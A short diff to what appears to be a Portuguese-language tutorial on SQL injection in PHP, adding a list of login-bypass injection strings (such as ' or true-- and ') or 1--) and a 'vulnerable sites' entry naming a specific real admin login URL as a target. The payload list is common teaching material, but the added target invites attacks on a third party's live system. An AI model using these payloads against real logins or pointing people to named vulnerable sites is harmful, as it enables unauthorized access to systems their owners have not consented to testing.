@@ -74,6 +74,25 @@ $stmt->execute();
 ```
 
 <br />
+Exemplos:
+```php
+' or ''='
+' or true--
+' or true
+") or true--
+") or ("")=("
+") or 1--
+") or ("x")=("
+')) or true--
+')) or ((''))=(('
+')) or 1--
+')) or (('x'))=(('
+```
+
+Sites vulneráveis:
+1) http://www.i2t2.com/admin/login.php
+
+<br />
 Referências:
 
  * http://php.net/manual/pt_BR/security.database.SQL-injection.php
